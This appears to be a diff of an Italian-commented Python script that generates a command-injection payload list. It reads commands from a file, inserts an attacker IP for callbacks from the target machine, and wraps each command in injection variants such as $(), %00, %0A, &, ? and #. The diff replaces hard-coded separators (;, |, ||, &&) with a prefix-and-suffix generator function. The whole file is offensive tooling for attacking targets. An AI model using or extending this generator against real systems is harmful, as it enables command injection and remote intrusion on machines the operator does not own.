@@ -1,5 +1,38 @@
 import sys
 
+# INPUT:
+# - <COMANDO>
+# - array di suffissi
+# - array di prefissi
+#
+# Per ogni comando genere un nuovo comando -> $(<COMANDO>)
+# OUTPUT: Per ogni <COMANDO> e $(<COMANDO>) genera 
+# <COMANDO>
+# <PREFISSO><COMANDO>
+# <PREFISSO><COMANDO><SUFFISSO-1>
+# <PREFISSO><COMANDO><SUFFISSO-2>
+#...
+# <PREFISSO><COMANDO><SUFFISSO-n>
+def genera_comandi_manipolati(comando_base, prefissi, suffissi):
+    comando_parentesi = f"$({comando_base})"
+    varianti_comando = [comando_base, comando_parentesi]
+    
+    comandi_generati = []
+    
+    for variante in varianti_comando:
+        # Tengo solo il comando
+        comandi_generati.append(f"{variante}")
+        for prefisso in prefissi:
+            # Aggiunge solo il prefisso
+            comandi_generati.append(f"{prefisso}{variante}")
+            
+            # Aggiunge prefisso + tutti i suffissi
+            for suffisso in suffissi:
+                comandi_generati.append(f"{prefisso}{variante}{suffisso}")
+    
+    return comandi_generati
+    
+
 if len(sys.argv) < 3:
     print("Usage: python script.py <ATTACKER-IP> <FILE-IN>")
     print("ATTACER-IP: IP della scheda di rete dell'attaccante su cui si riceveranno chiamate dalla macchina target")
@@ -12,6 +45,8 @@ if len(sys.argv) < 3:
 
 ip_address = sys.argv[1]
 file_in = sys.argv[2]
+prefissi = ["%00", "%0A"]
+suffissi = ["%00", "&", "?", "?%00", "#"]
 with open(file_in, 'r') as f:
     with open('out-command-injection-list.txt', 'w') as out:
         for line in f:
@@ -22,40 +57,11 @@ with open(file_in, 'r') as f:
             if "<ATTACKER-IP>" in line:
             	# se ho comandi con ATTACKER-IP lo sostituisco con l'IP reale
                 line = line.replace("<ATTACKER-IP>", ip_address)
-            # scrivo il comando sul file di uscita    
-            out.write(line + '\n')
             
-            # Lo script python restituisce poi per ogni comando le seguenti regole
-            # $(<COMANDO>)
-            out.write('$(' + line + ')\n')            
-            # %00<COMANDO>
-            out.write('%00' + line + '\n')
-            # <COMANDO>%00
-            out.write(line + '%00\n')
-            # <COMANDO>%
-            out.write(line + '%\n')
-            # %0A<COMANDO>
-            out.write('%0A' + line + '\n')            
-            # <COMANDO>%0A
-            out.write(line + '%0A\n')
-            # <COMANDO>?
-            out.write(line + '?\n')
-            # <COMANDO>?%00
-            out.write(line + '?%00\n')            
-            # <COMANDO>;
-            out.write(line + ';\n')
-            # <COMANDO>&
-            out.write(line + '&\n')
-            # <COMANDO>\n
-            out.write(line + '\\\\n\n')            
-            # ||<COMANDO>||
-            out.write('||' + line + '||\n')            
-            # |<COMANDO>|
-            out.write('|' + line + '|\n')            
-            # ;<COMANDO>|
-            out.write(';' + line + '|\n') 
-            # & <COMANDO>|
-            out.write('& ' + line + '|\n')               
-            # && <COMANDO>|
-            out.write('&& ' + line + '|\n')  
+            # Generazione comandi
+            lista_comandi = genera_comandi_manipolati(line, prefissi, suffissi)
+            for idx, cmd in enumerate(lista_comandi, 1):
+                print(f"{cmd}")
+                out.write(f"{cmd}" + '\n')
+                
             
